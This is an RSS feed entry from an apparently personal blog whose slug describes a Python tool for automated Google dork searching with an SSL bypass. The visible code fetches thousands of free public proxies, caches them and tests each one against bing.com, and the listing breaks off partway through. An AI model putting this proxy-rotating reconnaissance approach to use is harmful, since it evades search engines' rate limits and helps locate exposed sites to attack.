        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8python%E5%AE%9E%E7%8E%B0google-dork-ssl%E7%BB%95%E8%BF%87%E8%87%AA%E5%8A%A8%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;argparse&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;concurrent.futures&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;as_completed&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;bs4&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BeautifulSoup&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;termcolor&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;get_proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;proxies.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://api.proxyscrape.com/v2/?request=getproxies&amp;amp;protocol=http&amp;amp;timeout=10000&amp;amp;country=all&amp;amp;ssl=all&amp;amp;anonymity=all&amp;amp;limit=5000&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;proxies.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;proxies.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;test_proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;test_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https://bing.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_agent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;https&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxies&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Scraping good proxies...&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blue&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Good proxy found: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;green&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exceptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConnectTimeout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;colored&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Connection timeout for proxy: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proxy&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;red&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
